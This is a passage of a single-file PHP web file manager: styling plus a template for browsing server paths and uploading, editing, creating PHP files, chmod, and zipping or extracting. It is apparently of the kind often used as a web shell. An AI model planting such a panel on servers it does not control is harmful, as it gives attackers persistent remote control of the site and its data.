        .login-box::after {
            content: "SYSTEM ONLINE";
            position: absolute;
            top: 15px;
            right: 18px;
            color: var(--green);
            font: 700 9px/1 ui-monospace, SFMono-Regular, Consolas, monospace;
            letter-spacing: 1.5px;
            opacity: .75;
        }

        .logo { text-align: center; margin-bottom: 32px; }
        .logo span {
            width: 78px;
            height: 78px;
            margin: 0 auto 18px;
            display: grid;
            place-items: center;
            border-radius: 22px;
            font-size: 38px;
            background: linear-gradient(145deg, rgba(57,231,255,.12), rgba(168,85,247,.16));
            border: 1px solid rgba(57,231,255,.22);
            box-shadow: inset 0 0 25px rgba(57,231,255,.06), 0 0 35px rgba(57,231,255,.08);
        }

        .logo h2 {
            font-size: 25px;
            font-weight: 800;
            letter-spacing: .5px;
            background: linear-gradient(90deg, #fff, var(--cyan), #b98cff);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .logo p { color: var(--muted); font-size: 12px; margin-top: 8px; letter-spacing: .8px; }

        input[type="password"] {
            width: 100%;
            padding: 15px 17px;
            border: 1px solid rgba(120,180,255,.16);
            border-radius: 13px;
            background: rgba(0,0,0,.28);
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: .25s;
        }

        input[type="password"]::placeholder { color: #536b86; }
        input[type="password"]:focus {
            border-color: rgba(57,231,255,.6);
            box-shadow: 0 0 0 3px rgba(57,231,255,.07), 0 0 30px rgba(57,231,255,.09);
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(100deg, #157bff, #694cff 55%, #b43cff);
            color: #fff;
            border: 1px solid rgba(255,255,255,.12);
            border-radius: 13px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 750;
            letter-spacing: .3px;
            transition: .25s;
            margin-top: 9px;
            box-shadow: 0 10px 30px rgba(79,124,255,.18);
        }

        button:hover { transform: translateY(-2px); box-shadow: 0 14px 38px rgba(79,124,255,.30), 0 0 20px rgba(57,231,255,.08); }
        .error { color: #ff8c9d; text-align: center; margin-top: 16px; font-size: 12px; background: rgba(255,84,112,.08); border: 1px solid rgba(255,84,112,.16); padding: 11px; border-radius: 11px; }
        .hint { color: #506985; font-size: 11px; text-align: center; margin-top: 18px; }

        /* APP */
        .header {
            position: sticky;
            top: 0;
            z-index: 100;
            padding: 13px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 16px;
            background: rgba(3,9,20,.82);
            backdrop-filter: blur(22px);
            border-bottom: 1px solid var(--line);
            box-shadow: 0 10px 35px rgba(0,0,0,.25);
        }

        .header h1 { font-size: 16px; font-weight: 800; display: flex; align-items: center; gap: 10px; letter-spacing: .3px; }
        .header h1 span { color: var(--cyan); text-shadow: 0 0 18px rgba(57,231,255,.35); }
        .header .status { font-size: 10px; opacity: .55; font-family: ui-monospace, monospace; color: #91a9c4; }
        .header .right { display: flex; align-items: center; gap: 12px; }
        .header a {
            color: #9edfff;
            text-decoration: none;
            font-size: 11px;
            padding: 7px 12px;
            border-radius: 9px;
            border: 1px solid rgba(57,231,255,.18);
            background: rgba(57,231,255,.04);
            transition: .25s;
        }
        .header a:hover { color: #fff; border-color: rgba(57,231,255,.5); background: rgba(57,231,255,.10); box-shadow: 0 0 20px rgba(57,231,255,.08); }

        .container { position: relative; z-index: 1; max-width: 1450px; margin: 0 auto; padding: 22px; }

        .message {
            padding: 11px 16px;
            border-radius: 11px;
            margin-bottom: 15px;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideDown .3s ease;
        }
        @keyframes slideDown { from { opacity: 0; transform: translateY(-8px); } to { opacity: 1; transform: translateY(0); } }
        .message.success { background: rgba(53,240,160,.07); border: 1px solid rgba(53,240,160,.18); color: #75f5bd; }
        .message.error { background: rgba(255,84,112,.07); border: 1px solid rgba(255,84,112,.18); color: #ff9aaa; }

        .stats, .toolbar, .breadcrumb, .file-list, .editor {
            background: linear-gradient(145deg, rgba(8,20,39,.72), rgba(5,12,27,.68));
            border: 1px solid rgba(90,180,255,.10);
            box-shadow: 0 14px 50px rgba(0,0,0,.18);
            backdrop-filter: blur(15px);
        }

        .stats {
            display: flex; gap: 28px; padding: 12px 17px; border-radius: 13px; margin-bottom: 13px;
            font-size: 11px; flex-wrap: wrap;
        }
        .stats .stat { display: flex; align-items: center; gap: 7px; color: var(--muted); }
        .stats .stat strong { color: #cfe6ff; font-weight: 700; }

        .toolbar {
            display: flex; gap: 7px; flex-wrap: wrap; margin-bottom: 13px; padding: 10px 12px;
            border-radius: 13px; align-items: center;
        }
        .toolbar form { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
        .toolbar input[type="text"], .toolbar input[type="file"], .toolbar select {
            padding: 7px 11px; border: 1px solid rgba(110,190,255,.12); border-radius: 9px;
            background: rgba(0,0,0,.25); color: #cce5ff; font-size: 11px; outline: none; transition: .25s; min-width: 100px;
        }
        .toolbar input:focus { border-color: rgba(57,231,255,.55); box-shadow: 0 0 18px rgba(57,231,255,.06); }
        .toolbar button {
            width: auto; padding: 7px 12px; background: rgba(255,255,255,.035);
            border: 1px solid rgba(110,190,255,.12); border-radius: 9px; color: #a9bfd8;
            cursor: pointer; font-size: 11px; transition: .25s; margin-top: 0; box-shadow: none;
        }
        .toolbar button:hover { background: rgba(57,231,255,.08); border-color: rgba(57,231,255,.35); color: #fff; transform: translateY(-1px); }
        .toolbar .primary {
            background: linear-gradient(100deg, #116eff, #744cff); border: none; color: #fff;
            box-shadow: 0 6px 20px rgba(79,124,255,.20);
        }

        .breadcrumb {
            font-size: 11px; color: #526a84; padding: 9px 14px; border-radius: 11px; margin-bottom: 13px;
            word-break: break-all;
        }
        .breadcrumb a { color: #6edfff; text-decoration: none; transition: .2s; }
        .breadcrumb a:hover { color: #fff; text-shadow: 0 0 12px rgba(57,231,255,.5); }
        .breadcrumb .sep { color: #344a63; margin: 0 4px; }

        .file-list { border-radius: 14px; overflow: hidden; }
        table { width: 100%; border-collapse: collapse; }
        th {
            padding: 11px 15px; text-align: left; font-size: 9px; text-transform: uppercase;
            letter-spacing: 1px; color: #5d7692; font-weight: 800; border-bottom: 1px solid rgba(100,190,255,.10);
            background: rgba(0,0,0,.13);
        }
        td { padding: 9px 15px; border-bottom: 1px solid rgba(100,190,255,.055); font-size: 12px; vertical-align: middle; }
        tr { transition: .18s; }
        tr:hover td { background: rgba(57,231,255,.035); }
        .file-row .icon { font-size: 17px; margin-right: 9px; filter: drop-shadow(0 0 6px rgba(57,231,255,.12)); }
        .file-row .name { display: inline-flex; align-items: center; }
        .file-row .name a { color: #bcd2e8; text-decoration: none; transition: .2s; }
        .file-row .name a:hover { color: var(--cyan); text-shadow: 0 0 12px rgba(57,231,255,.28); }
        .file-row .dir a { font-weight: 700; color: #b18cff; }
        .file-row .dir a:hover { color: #d5c1ff; }
        .size-col { color: #67819c; font-size: 11px; font-family: ui-monospace, monospace; }
        .date-col { color: #58708a; font-size: 10px; }
        .perms-col { font-family: ui-monospace, monospace; font-size: 10px; color: #4e6680; }

        .actions { display: flex; gap: 4px; flex-wrap: wrap; align-items: center; }
        .actions button, .actions a {
            padding: 4px 9px; border: 1px solid transparent; border-radius: 7px; cursor: pointer;
            font-size: 10px; transition: .2s; text-decoration: none; display: inline-flex; align-items: center; gap: 4px;
            width: auto; margin: 0; box-shadow: none;
        }
        .actions .del { background: rgba(255,84,112,.07); color: #ff8799; border-color: rgba(255,84,112,.10); }
        .actions .del:hover { background: rgba(255,84,112,.16); border-color: rgba(255,84,112,.28); }
        .actions .edit-btn { background: rgba(79,124,255,.08); color: #81aaff; border-color: rgba(79,124,255,.13); }
        .actions .edit-btn:hover { background: rgba(79,124,255,.17); }
        .actions .preview-btn { background: rgba(53,240,160,.07); color: #70efb5; border-color: rgba(53,240,160,.12); }
        .actions .preview-btn:hover { background: rgba(53,240,160,.15); }
        .actions .copy-btn { background: rgba(255,200,75,.07); color: #ffd675; border-color: rgba(255,200,75,.12); }
        .actions .copy-btn:hover { background: rgba(255,200,75,.15); }
        .actions .chmod-btn { background: rgba(168,85,247,.08); color: #c99aff; border-color: rgba(168,85,247,.13); }
        .actions .chmod-btn:hover { background: rgba(168,85,247,.17); }

        .inline-form { display: inline-flex; gap: 4px; align-items: center; }
        .inline-form input {
            padding: 4px 7px; border: 1px solid rgba(110,190,255,.10); border-radius: 6px;
            background: rgba(0,0,0,.22); color: #bdd3e8; font-size: 10px; width: 70px; outline: none;
        }
        .inline-form input:focus { border-color: rgba(57,231,255,.4); }
        .inline-form button { padding: 4px 7px; border: 1px solid rgba(110,190,255,.10); border-radius: 6px; background: rgba(255,255,255,.03); color: #7891aa; cursor: pointer; font-size: 10px; transition: .2s; width: auto; margin: 0; box-shadow: none; }
        .inline-form button:hover { background: rgba(57,231,255,.08); color: #fff; }

        .editor { padding: 18px; border-radius: 14px; margin-bottom: 15px; }
        .editor h3 { font-size: 13px; font-weight: 600; margin-bottom: 11px; color: #91aac3; }
        .editor textarea {
            width: 100%; min-height: 420px; font-family: "Fira Code", "Cascadia Code", Consolas, monospace;
            font-size: 12px; line-height: 1.6; padding: 15px; border: 1px solid rgba(100,190,255,.10);
            border-radius: 10px; background: rgba(0,0,0,.35); color: #bfe4ff; resize: vertical; outline: none;
        }
        .editor textarea:focus { border-color: rgba(57,231,255,.4); box-shadow: inset 0 0 35px rgba(57,231,255,.025); }
        .editor .actions { margin-top: 11px; display: flex; gap: 9px; }
        .editor .actions button { padding: 9px 20px; border-radius: 9px; border: none; cursor: pointer; font-size: 12px; font-weight: 700; transition: .25s; width: auto; margin: 0; }
        .editor .actions .save { background: linear-gradient(100deg, #1176ff, #7b42ff); color: #fff; }
        .editor .actions .save:hover { transform: translateY(-1px); box-shadow: 0 10px 25px rgba(79,124,255,.2); }
        .editor .actions .cancel { background: rgba(255,255,255,.045); color: #7890a8; }

        .preview-box {
            background: rgba(0,0,0,.32); padding: 16px; border-radius: 10px;
            border: 1px solid rgba(100,190,255,.08); margin-bottom: 15px; max-height: 520px; overflow: auto;
            font-family: ui-monospace, monospace; font-size: 12px; line-height: 1.6; white-space: pre-wrap; word-break: break-word;
        }
        .preview-box .empty { color: #496079; text-align: center; padding: 40px; }

        .modal {
            display: none; position: fixed; inset: 0; width: 100%; height: 100%;
            background: rgba(0,3,10,.78); backdrop-filter: blur(13px); z-index: 1000; align-items: center; justify-content: center;
            padding: 20px;
        }
        .modal.active { display: flex; }
        .modal-content {
            position: relative; background: linear-gradient(145deg, #09162b, #050b18);
            border: 1px solid rgba(57,231,255,.16); padding: 25px; border-radius: 18px;
            width: 90%; max-width: 480px; max-height: 90vh; overflow-y: auto;
            box-shadow: 0 30px 100px rgba(0,0,0,.65), 0 0 40px rgba(57,231,255,.05);
        }
        .modal-content::before {
            content: ""; position: absolute; top: 0; left: 12%; right: 12%; height: 1px;
            background: linear-gradient(90deg, transparent, var(--cyan), transparent); box-shadow: 0 0 15px var(--cyan);
        }
        .modal-content h3 { font-size: 15px; margin-bottom: 14px; font-weight: 700; color: #d9ecff; }
        .modal-content input, .modal-content select {
            width: 100%; padding: 10px 12px; border: 1px solid rgba(100,190,255,.11); border-radius: 9px;
            background: rgba(0,0,0,.3); color: #c8e2fb; font-size: 12px; margin-bottom: 9px; outline: none;
        }
        .modal-content input:focus, .modal-content select:focus { border-color: rgba(57,231,255,.45); }
        .modal-content button { width: 100%; padding: 10px; border: none; border-radius: 9px; cursor: pointer; font-size: 12px; font-weight: 700; transition: .2s; margin-bottom: 6px; }
        .modal-content .confirm { background: linear-gradient(100deg, #1176ff, #7b42ff); color: white; }
        .modal-content .confirm:hover { transform: translateY(-1px); box-shadow: 0 10px 25px rgba(79,124,255,.2); }
        .modal-content .cancel { background: rgba(255,255,255,.045); color: #7890a8; }
        .modal-content .danger { background: rgba(255,84,112,.12); color: #ff91a1; }
        .modal-content .checkbox-group { display: flex; flex-wrap: wrap; gap: 6px; max-height: 200px; overflow-y: auto; margin: 9px 0; padding: 10px; background: rgba(0,0,0,.2); border-radius: 8px; }
        .modal-content .checkbox-group label { display: flex; align-items: center; gap: 6px; font-size: 11px; color: #7891aa; cursor: pointer; padding: 3px 6px; border-radius: 5px; }
        .modal-content .checkbox-group label:hover { background: rgba(57,231,255,.05); color: #c7e7ff; }

        .empty-state { text-align: center; padding: 55px 20px; color: #466078; }
        .empty-state .icon { font-size: 44px; margin-bottom: 10px; display: block; filter: grayscale(.2); }
        .empty-state p { font-size: 12px; }
        .search-badge {
            background: rgba(57,231,255,.06); padding: 4px 10px; border-radius: 20px;
            font-size: 10px; color: #6edfff; display: inline-flex; align-items: center; gap: 6px;
            border: 1px solid rgba(57,231,255,.12);
        }
        .search-badge a { color: #6edfff; text-decoration: none; }

        @media (max-width: 768px) {
            .header { padding: 10px 14px; flex-wrap: wrap; gap: 8px; }
            .header h1 { font-size: 14px; }
            .header .right { margin-left: auto; }
            .header .right > .status { display: none; }
            .container { padding: 11px; }
            .toolbar { padding: 9px; }
            .toolbar form { width: 100%; }
            .toolbar input[type="text"] { width: 100% !important; }
            .toolbar input[type="file"] { width: calc(100% - 78px); min-width: 0; }
            td { padding: 8px 9px; font-size: 11px; }
            th { padding: 9px; }
            .actions { gap: 2px; }
            .actions button, .actions a { font-size: 9px; padding: 3px 6px; }
            .stats { gap: 10px; font-size: 10px; }
            .inline-form input { width: 55px; }
            .hide-mobile { display: none; }
            .login-box { padding: 40px 24px; }
        }

        @media print {
            .header, .toolbar, .breadcrumb, .actions, .stats { display: none; }
            body { background: white; color: black; }
            body::before, body::after { display: none; }
            .file-list { border: 1px solid #ddd; }
            th { background: #f5f5f5; color: #333; }
            td { border-color: #ddd; }
            tr:hover td { background: white; }
        }

    </style>
</head>
<body>
    <div class="header">
        <h1>📁 <span>File Manager</span> <span class="status">v2.0</span></h1>
        <div class="right">
            <span class="status"><?php echo htmlspecialchars($root_dir); ?></span>
            <?php if (isset($_SESSION['search_results'])): ?>
                <span class="search-badge">🔍 <?php echo count($_SESSION['search_results']); ?> results <a href="?clear_search=1">✕</a></span>
            <?php endif; ?>
            <a href="?logout=1">🚪 Logout</a>
        </div>
    </div>

    <div class="container">
        <?php if ($message): ?>
            <div class="message success"><?php echo htmlspecialchars($message); ?></div>
        <?php endif; ?>
        <?php if ($error_msg): ?>
            <div class="message error"><?php echo htmlspecialchars($error_msg); ?></div>
        <?php endif; ?>

        <?php if (!$edit_file && !$preview_file): ?>
            <!-- Stats -->
            <div class="stats">
                <span class="stat">📊 <strong><?php echo format_file_count($items); ?></strong></span>
                <span class="stat">💾 <strong><?php echo get_total_size($items); ?></strong></span>
                <span class="stat">📂 <strong><?php echo htmlspecialchars($rel_dir ?: 'Root'); ?></strong></span>
            </div>

            <!-- Toolbar -->
            <div class="toolbar">
                <form method="GET">
                    <input type="text" name="dir" value="<?php echo htmlspecialchars($rel_dir); ?>" placeholder="Path" style="min-width:200px;">
                    <button type="submit" class="primary">Go</button>
                </form>
                
                <form method="POST">
                    <input type="text" name="mkdir" placeholder="New folder" style="min-width:120px;">
                    <button type="submit" name="mkdir">📁 Create</button>
                </form>
                
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="upload" style="min-width:120px;">
                    <button type="submit" name="upload_file">📤 Upload</button>
                </form>
                
                <button onclick="document.getElementById('createFileModal').classList.add('active')">📄 New File</button>
                <button onclick="document.getElementById('zipModal').classList.add('active')">📦 ZIP</button>
                <button onclick="document.getElementById('searchModal').classList.add('active')">🔍 Search</button>
            </div>

            <!-- Breadcrumb -->
            <div class="breadcrumb">
                <a href="?dir=">🏠 Root</a>
                <?php
                $parts = explode('/', $rel_dir);
                $build = '';
                foreach ($parts as $part) {
                    if ($part === '') continue;
                    $build .= '/' . $part;
                    echo ' <span class="sep">›</span> <a href="?dir=' . urlencode($build) . '">' . htmlspecialchars($part) . '</a>';
                }
                ?>
            </div>
        <?php endif; ?>

        <!-- Preview -->
        <?php if ($preview_file): ?>
            <div style="margin-bottom:16px; display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px;">
                <h3 style="font-weight:400; font-size:16px;">👁️ <?php echo htmlspecialchars(basename($preview_file)); ?></h3>
                <a href="?dir=<?php echo urlencode($rel_dir); ?>" style="color:#888; text-decoration:none; font-size:13px;">← Back</a>
            </div>
            <div class="preview-box">
                <?php 
                $content = get_file_preview($preview_file);
                if ($content !== null) {
                    echo $content;
                } else {
                    echo '<div class="empty">📄 Preview not available for this file type or file is too large</div>';
                }
                ?>
            </div>
        <?php endif; ?>

        <!-- Editor -->
        <?php if ($edit_file): ?>
            <div class="editor">
                <h3>✏️ <?php echo htmlspecialchars(str_replace($root_dir, '', $edit_file)); ?></h3>
                <form method="POST">
                    <input type="hidden" name="file_name" value="<?php echo htmlspecialchars(basename($edit_file)); ?>">
                    <textarea name="file_content"><?php echo htmlspecialchars(file_get_contents($edit_file)); ?></textarea>
                    <div class="actions">
                        <button type="submit" name="save_file" class="save">💾 Save File</button>
                        <a href="?dir=<?php echo urlencode($rel_dir); ?>" class="cancel" style="padding:10px 24px; border-radius:10px; background:rgba(255,255,255,0.05); color:#888; text-decoration:none; font-size:13px;">Cancel</a>
                    </div>
                </form>
            </div>
        <?php endif; ?>

        <!-- File List -->
        <?php if (!$edit_file && !$preview_file): ?>
            <div class="file-list">
                <table>
                    <thead>
                        <tr>
                            <th style="width:40%;">Name</th>
                            <th class="hide-mobile">Size</th>
                            <th class="hide-mobile">Modified</th>
                            <th class="hide-mobile" style="width:70px;">Perms</th>
                            <th style="width:30%;">Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if ($rel_dir !== ''): ?>
                            <tr class="file-row">
                                <td><span class="icon">⬆️</span> <a href="?dir=<?php echo urlencode(dirname($rel_dir)); ?>" style="color:#888; font-weight:500;">..</a></td>
                                <td class="hide-mobile"></td>
                                <td class="hide-mobile"></td>
                                <td class="hide-mobile"></td>
                                <td></td>
                            </tr>
                        <?php endif; ?>
                        
                        <?php 
                        $display_items = $show_search ? $search_results : $items;
                        foreach ($display_items as $item): 
                            $display_name = $show_search ? basename($item['name']) : $item['name'];
                        ?>
                            <tr class="file-row">
                                <td>
                                    <span class="icon"><?php echo $item['is_dir'] ? '📁' : get_file_icon($display_name); ?></span>
                                    <span class="name <?php echo $item['is_dir'] ? 'dir' : 'file'; ?>">
                                        <?php if ($item['is_dir']): ?>
                                            <a href="?dir=<?php echo urlencode($rel_dir . '/' . $display_name); ?>"><?php echo htmlspecialchars($display_name); ?></a>
                                        <?php else: ?>
                                            <a href="?dir=<?php echo urlencode($rel_dir); ?>&edit=<?php echo urlencode($display_name); ?>"><?php echo htmlspecialchars($display_name); ?></a>
                                        <?php endif; ?>
                                    </span>
                                </td>
                                <td class="size-col hide-mobile"><?php echo $item['is_dir'] ? '—' : get_size($item['size']); ?></td>
                                <td class="date-col hide-mobile"><?php echo $item['modified'] ?? '—'; ?></td>
                                <td class="perms-col hide-mobile"><?php echo $item['permissions'] ?? '—'; ?></td>
                                <td class="actions">
                                    <?php if (!$item['is_dir']): ?>
                                        <a href="?dir=<?php echo urlencode($rel_dir); ?>&edit=<?php echo urlencode($display_name); ?>" class="edit-btn">✏️</a>
                                        <a href="?dir=<?php echo urlencode($rel_dir); ?>&preview=<?php echo urlencode($display_name); ?>" class="preview-btn">👁️</a>
                                        <button onclick="openCopyModal('<?php echo htmlspecialchars($display_name); ?>')" class="copy-btn">📋</button>
                                        <button onclick="openChmodModal('<?php echo htmlspecialchars($display_name); ?>')" class="chmod-btn">🔐</button>
                                    <?php endif; ?>
                                    
                                    <form method="POST" class="inline-form" onsubmit="return confirm('Delete <?php echo $item['is_dir'] ? 'folder' : 'file'; ?>?')">
                                        <input type="hidden" name="<?php echo $item['is_dir'] ? 'delete_dir' : 'delete_file'; ?>" value="<?php echo htmlspecialchars($display_name); ?>">
                                        <input type="hidden" name="confirm_delete" value="1">
                                        <button type="submit" class="del">🗑️</button>
                                    </form>
                                    
                                    <form method="POST" class="inline-form">
                                        <input type="hidden" name="rename_old" value="<?php echo htmlspecialchars($display_name); ?>">
                                        <input type="text" name="rename_new" placeholder="rename" size="8">
                                        <button type="submit" name="rename">↻</button>
                                    </form>
                                </td>
                            </tr>
                        <?php endforeach; ?>
                        <?php if (empty($display_items)): ?>
                            <tr><td colspan="5" style="padding:40px; text-align:center; color:#444;">
                                <div class="empty-state">
                                    <span class="icon">📭</span>
                                    <p><?php echo $show_search ? 'No results found for "' . htmlspecialchars($search_query) . '"' : 'This folder is empty'; ?></p>
                                </div>
                            </td></tr>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        <?php endif; ?>
    </div>

    <!-- Modals -->
    <div id="createFileModal" class="modal">
        <div class="modal-content">
            <h3>📄 Create New File</h3>
            <form method="POST">
                <input type="text" name="filename" placeholder="filename.php" required>
                <button type="submit" name="create_file" class="confirm">Create File</button>
                <button type="button" class="cancel" onclick="document.getElementById('createFileModal').classList.remove('active')">Cancel</button>
            </form>
        </div>
    </div>

    <div id="zipModal" class="modal">
        <div class="modal-content">
            <h3>📦 ZIP Files</h3>
            <form method="POST">
                <input type="text" name="zip_name" placeholder="Archive name (without .zip)" required>
                <div class="checkbox-group">
                    <?php foreach ($items as $item): ?>
                        <label>
                            <input type="checkbox" name="zip_files[]" value="<?php echo htmlspecialchars($item['name']); ?>">
                            <?php echo htmlspecialchars($item['name']); ?>
                        </label>
                    <?php endforeach; ?>
                </div>
                <button type="submit" name="create_zip" class="confirm">📦 Create ZIP</button>
                <button type="button" class="cancel" onclick="document.getElementById('zipModal').classList.remove('active')">Cancel</button>
            </form>
            <hr style="border-color:rgba(255,255,255,0.05); margin:16px 0;">
            <form method="POST">
                <select name="extract_zip" style="width:100%; padding:10px; border-radius:10px; background:rgba(0,0,0,0.3); color:#c8c8e0; border:1px solid rgba(255,255,255,0.06); margin-bottom:10px;">
                    <option value="">Select ZIP to extract</option>
                    <?php foreach ($items as $item): ?>
                        <?php if (!$item['is_dir'] && strtolower(pathinfo($item['name'], PATHINFO_EXTENSION)) === 'zip'): ?>
                            <option value="<?php echo htmlspecialchars($item['name']); ?>"><?php echo htmlspecialchars($item['name']); ?></option>
                        <?php endif; ?>
                    <?php endforeach; ?>
                </select>
                <button type="submit" name="extract_zip" class="confirm">📂 Extract ZIP</button>
            </form>
        </div>
    </div>

    <div id="searchModal" class="modal">
        <div class="modal-content">
            <h3>🔍 Search Files</h3>
            <form method="POST">
                <input type="text" name="search_query" placeholder="Search by name..." required>
                <button type="submit" name="search" class="confirm">Search</button>
                <button type="button" class="cancel" onclick="document.getElementById('searchModal').classList.remove('active')">Cancel</button>
            </form>
        </div>
    </div>

    <div id="copyModal" class="modal">
        <div class="modal-content">
            <h3>📋 Copy File</h3>
            <form method="POST">
                <input type="hidden" name="copy_source" id="copy_source">
                <input type="text" name="copy_dest" placeholder="New filename" required>
                <button type="submit" name="copy_file" class="confirm">📋 Copy</button>
                <button type="button" class="cancel" onclick="document.getElementById('copyModal').classList.remove('active')">Cancel</button>
            </form>
            <hr style="border-color:rgba(255,255,255,0.05); margin:12px 0;">
            <h3 style="font-size:14px; margin-top:8px;">📦 Move File</h3>
            <form method="POST">
                <input type="hidden" name="move_source" id="move_source">
                <input type="text" name="move_dest" placeholder="New filename" required>
                <button type="submit" name="move_file" class="confirm">📦 Move</button>
            </form>
        </div>
    </div>

    <div id="chmodModal" class="modal">
        <div class="modal-content">
            <h3>🔐 Change Permissions</h3>
            <form method="POST">
                <input type="hidden" name="chmod_target" id="chmod_target">
                <input type="text" name="chmod_perms" placeholder="0644 or 0755" required>
                <button type="submit" name="chmod" class="confirm">🔐 Apply</button>
                <button type="button" class="cancel" onclick="document.getElementById('chmodModal').classList.remove('active')">Cancel</button>
            </form>
        </div>
    </div>

    <script>
        function openCopyModal(filename) {
            document.getElementById('copy_source').value = filename;
            document.getElementById('move_source').value = filename;
            document.getElementById('copyModal').classList.add('active');
        }
        
        function openChmodModal(filename) {
            document.getElementById('chmod_target').value = filename;
            document.getElementById('chmodModal').classList.add('active');
        }
        
        // Close modals on backdrop click
        document.querySelectorAll('.modal').forEach(modal => {
            modal.addEventListener('click', function(e) {
                if (e.target === this) {
                    this.classList.remove('active');
                }
            });
        });
        
        // Keyboard shortcuts
        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                document.querySelectorAll('.modal.active').forEach(modal => {
                    modal.classList.remove('active');
                });
            }
            if ((e.ctrlKey || e.metaKey) && e.key === 'f') {
                e.preventDefault();
                document.getElementById('searchModal').classList.add('active');
            }
        });
    </script>
</body>
</html>